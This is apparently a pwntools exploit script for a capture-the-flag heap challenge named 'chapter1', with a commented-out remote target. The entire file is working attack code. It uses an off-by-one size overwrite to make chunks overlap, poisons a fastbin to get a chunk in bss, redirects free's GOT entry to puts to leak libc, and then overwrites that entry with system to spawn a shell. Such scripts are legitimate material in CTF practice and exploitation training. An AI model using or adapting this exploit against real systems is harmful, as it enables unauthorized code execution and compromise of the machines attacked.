from pwn import *
from time import sleep

p = process('chapter1')
#p = remote('159.65.88.44',31083)

        
def send(a,b=':'):
    p.sendlineafter(b,str(a))
    sleep(.1)

def send2(a,b=':'):
    p.sendafter(b,str(a))

def create(size,data):
    send(1,'>>')
    send(size)
    send(data)

def edit(index,data):
    send(2,'>>')
    send(index)
    send(data)

def delete(index):
    send(3,'>>')
    send(index)


print "creating chunks"
create(0x68,'a'*0x68) #top
create(0x68,'b') #modified chunk
create(0x68,'c') #overflowed chunk
create(0x18,'d') #overflowed chunk
create(0x68,'/bin/sh\x00barrier')

print "attempting size overwrite"
edit(0,'a'*0x68 + '\xe1')
delete(1)
delete(3)
delete(2)

print "getting chunk in bss"
ptr=0x60209d
create(0x90,'a'*0x68+p64(0x71)+p64(ptr))

create(100,'/bin/sh\x00')

free_got = 0x602018
puts_plt = 0x4006E0
create(100,'a'*19+p64(free_got)+p64(free_got+8)+p64(free_got+16)) #overlap
edit(0,p64(puts_plt))

print "leaking libc"
delete(1)
p.readuntil('\x90')
t = '\x90'+p.readuntil('\n')[:5]
print t.encode('hex')
libc = u64(t.ljust(8,'\x00'))-0x6f690
print hex(libc)
system = libc+0x45390

edit(2,p64(system)[:6])

send(2,'>>')
send(4)


print "shell"
#gdb.attach(p)
p.interactive()
